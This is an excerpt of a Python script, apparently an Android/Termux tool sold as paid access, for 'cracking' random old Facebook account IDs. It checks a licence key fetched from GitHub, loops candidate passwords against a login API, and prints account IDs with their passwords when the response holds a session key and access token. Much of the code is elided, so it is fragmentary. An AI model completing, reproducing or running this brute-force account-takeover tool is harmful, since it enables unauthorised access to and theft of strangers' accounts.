...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/FBHACK405/paid.txt/blob/main/approval.txt"])
...
def notice():
	...
	runtxt("\033[0;92m ADMIN SOHAN")
	subprocess.check_output(["am", "start", "https://wa.me/+966595246369"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Devil-S1X4N/test/blob/main/aprv.txtt').text
			if basesplit in plr:
				key = basesplit
...
\33[1;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\33[1;34m█  \33[mGITHUB: https://github.com/\33[1;32mFBHACK405
\33[1;34m█  \33[mFACEBOOK: \33[1;32mJBD KING 👑 ABDULLAH
\33[1;34m█  \33[mVERSION: \33[1;32m 2.0
\33[1;34m█  \33[mTOOLS : \33[1;32mPAID & This tool is not mine
\33[1;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
    """)
		...
		print("%s [%s03%s]%s CRACK RANDOM FB ID 2004-5 %s (PRO) V3[Super Slowed]"%(R,G,R,Y,G))
	...
	def oldcrack(self):
		...
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO 0key ?:)"%(R))
		try:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SHADOW_OLD] : %s/%s -> \033[0;92m [ OLD-OK:%s ]- \033[0;91m[OLD-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
    ...
    'Referer': 'https://github.com/MUMIT-404-CYBER/OPEN-SOURCE',
    ...
    'sec-ch-ua-platform': '"Linux"',
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SHADOW-OK] %s|%s\033[0;97m         "%(uid, pw))
